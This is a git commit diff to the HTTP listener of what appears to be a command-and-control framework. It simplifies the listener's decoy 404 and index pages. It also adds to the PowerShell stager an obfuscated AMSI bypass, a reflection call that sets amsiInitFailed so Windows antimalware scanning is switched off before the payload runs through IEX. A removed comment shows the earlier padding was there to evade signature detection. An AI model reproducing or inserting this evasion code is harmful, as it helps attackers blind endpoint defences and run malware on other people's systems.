bda478dbd96020a9833ef69a5198942093c20b6f
Vincent Yiu <vysec.private@gmail.com>
2018-11-25 12:43:29 +0800

    change

--- lib/listeners/http.py
+++ lib/listeners/http.py
@@ -163,36 +163,14 @@ class Listener:
         """
 
         return '\n'.join([
-            '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
-            '<html xmlns="http://www.w3.org/1999/xhtml">',
+        	'<html>',
             '<head>',
-            '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>',
-            '<title>404 - File or directory not found.</title>',
-            '<style type="text/css">',
-            '<!--',
-            'body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}',
-            'fieldset{padding:0 15px 10px 15px;}',
-            'h1{font-size:2.4em;margin:0;color:#FFF;}',
-            'h2{font-size:1.7em;margin:0;color:#CC0000;}',
-            'h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}',
-            '#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;',
-            'background-color:#555555;}',
-            '#content{margin:0 0 0 2%;position:relative;}',
-            '.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}',
-            '-->',
-            '</style>',
+            '<title>404</title>',
             '</head>',
             '<body>',
-            '<div id="header"><h1>Server Error</h1></div>',
-            '<div id="content">',
-            ' <div class="content-container"><fieldset>',
-            '  <h2>404 - File or directory not found.</h2>',
-            '  <h3>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</h3>',
-            ' </fieldset></div>',
-            '</div>',
+            '404',
             '</body>',
             '</html>',
-            ' ' * self.header_offset,  # randomize the length of the header to evade signature based detection
         ])
 
     def index_page(self):
@@ -201,36 +179,11 @@ class Listener:
         """
 
         return '\n'.join([
-            '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
-            '<html xmlns="http://www.w3.org/1999/xhtml">',
+            '<html>',
             '<head>',
-            '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />',
-            '<title>IIS7</title>',
-            '<style type="text/css">',
-            '<!--',
-            'body {',
-            '    color:#000000;',
-            '    background-color:#B3B3B3;',
-            '    margin:0;',
-            '}',
-            '',
-            '#container {',
-            '    margin-left:auto;',
-            '    margin-right:auto;',
-            '    text-align:center;',
-            '    }',
-            '',
-            'a img {',
-            '    border:none;',
-            '}',
-            '',
-            '-->',
-            '</style>',
+            '<title>Index</title>',
             '</head>',
             '<body>',
-            '<div id="container">',
-            '<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="welcome.png" alt="IIS7" width="571" height="411" /></a>',
-            '</div>',
             '</body>',
             '</html>',
         ])
@@ -400,6 +353,8 @@ class Listener:
 
                 # decode everything and kick it over to IEX to kick off execution
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
+
+                stager = "[Ref].Assembly.GetType('System.'+'Man'+'agement.Aut'+'omation.Am'+'siUtils').GetField('ams'+'iInit'+'Fai'+'led','Non'+'Pub'+'lic,S'+'tatic').SetValue($null,$true);" + stager
 
                 if obfuscate:
                     stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
